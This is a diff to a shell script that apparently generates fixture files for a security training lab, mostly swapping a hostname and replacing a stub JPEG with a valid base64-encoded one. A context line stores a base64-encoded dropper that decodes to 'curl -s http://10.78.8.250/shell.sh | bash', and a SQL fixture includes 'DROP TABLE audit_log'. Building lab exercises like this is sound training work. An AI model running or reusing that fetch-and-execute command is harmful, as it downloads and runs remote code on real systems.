@@ -76,7 +76,7 @@ printf "2026-05-13T10:00:01Z INFO sshd accepted\n2026-05-13T10:00:02Z WARN disk 
 printf "SELECT id FROM users;\nDROP TABLE audit_log;\nSELECT count(*) FROM sessions;\nDROP INDEX idx_sessions;\nSELECT ok;\n" >"$LABS_HOME/data/edits/db-replay.sql"
 printf "auth=REDACT_ME\nretry=REDACT_ME\nnote=REDACT_ME tail\n" >"$LABS_HOME/data/edits/tokenized.conf"
 printf "10.0.0.1 left 10.0.0.1 right\nonly 10.0.0.1 once\n10.0.0.1 A 10.0.0.1 B 10.0.0.1 C\n" >"$LABS_HOME/data/edits/ip-line.txt"
-printf "see http://webserver/docs and also http://webserver/api/status.php\n" >"$LABS_HOME/data/edits/urls.txt"
+printf "see http://lab-web/docs and also http://lab-web/api/status.php\n" >"$LABS_HOME/data/edits/urls.txt"
 printf "contact alice@example.com please\nadmin root@corp.internal now\n" >"$LABS_HOME/data/edits/contacts.txt"
 printf "noise MODULE05_FLAG=silver-rim-220 more noise\n" >"$LABS_HOME/data/edits/flag-line.txt"
 printf "INFO start\nWARN disk low\nERROR db down\nWARN retry\nINFO ok\n" >"$LABS_HOME/data/edits/events.log"
@@ -113,8 +113,22 @@ sys.stdout.buffer.write(data)
 printf '#!/bin/bash\ncurl -s http://10.78.8.250/shell.sh | bash\n' | base64 -w 0 > "$FDIR/dropper.b64"
 printf '\n' >> "$FDIR/dropper.b64"
 
-# photo.jpg: minimal JFIF with attacker-stamped EXIF metadata
-printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > "$FDIR/photo.jpg"
+# photo.jpg: valid tiny JFIF with attacker-stamped EXIF metadata
+python3 << 'PYEOF' > "$FDIR/photo.jpg"
+import base64
+import sys
+
+data = (
+    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////"
+    "2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/"
+    "8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAH/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/"
+    "9oACAEBAAEFAqf/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDAQE/ASP/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAECAQE/ASP/"
+    "xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBAAY/Al//xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBAAE/IV//2gAMAwEAAgADAAAAEP/"
+    "EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QH//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QH//EABQQAQAAAAAAAAAAAA"
+    "AAAAAAABD/2gAIAQEAAT8QH//Z"
+)
+sys.stdout.buffer.write(base64.b64decode(data))
+PYEOF
 exiftool -overwrite_original -q \
   -Artist="ops-team" \
   -Comment="captured: 2024-03-15 02:31:07" \
